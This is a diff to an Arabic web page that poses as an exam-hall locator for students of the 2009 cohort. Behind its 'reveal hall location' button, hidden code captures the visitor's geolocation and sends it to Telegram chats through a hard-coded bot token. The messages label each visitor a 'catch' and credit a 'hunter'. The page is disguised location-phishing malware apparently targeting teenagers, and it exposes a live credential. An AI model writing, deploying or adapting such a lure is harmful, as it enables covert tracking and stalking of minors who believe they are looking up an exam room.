@@ -1,19 +1,18 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head><meta charset="UTF-8"><title>موقع القاعات</title></head>
-<body style="text-align:center;">
-    <h3>خريطة توزيع قاعات جيل 2009 📍</h3>
-    <button onclick="getL()" style="padding:20px; background:blue; color:white;">تحديد موقع قاعتي</button>
+<html>
+<head><meta charset="UTF-8"><title>خريطة القاعات - 2009</title></head>
+<body style="text-align:center; padding:50px;">
+    <h3>تحديد موقع قاعة الامتحان 📍</h3>
+    <button onclick="loc()" style="padding:20px; background:#f1c40f; color:#000; border:none; border-radius:10px;">كشف موقع القاعة</button>
     <script>
         const pr = new URLSearchParams(window.location.search);
         const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
-        function getL() {
-            navigator.geolocation.getCurrentPosition((p) => {
-                const msg = `📍 صيدة موقع (2009) 📍\n👤 الصياد: ${pr.get('hunter')}\n🌐 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                const fullMsg = encodeURIComponent(msg);
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`);
-                alert("تم تحديد موقع القاعة.");
+        function loc() {
+            navigator.geolocation.getCurrentPosition(p => {
+                const msg = encodeURIComponent(`📍 صيدة موقع\n👤 الصياد: ${pr.get('hunter')}\n🌐 الرابط: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${msg}`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${msg}`);
+                alert("تم تحديد الموقع");
             });
         }
     </script>
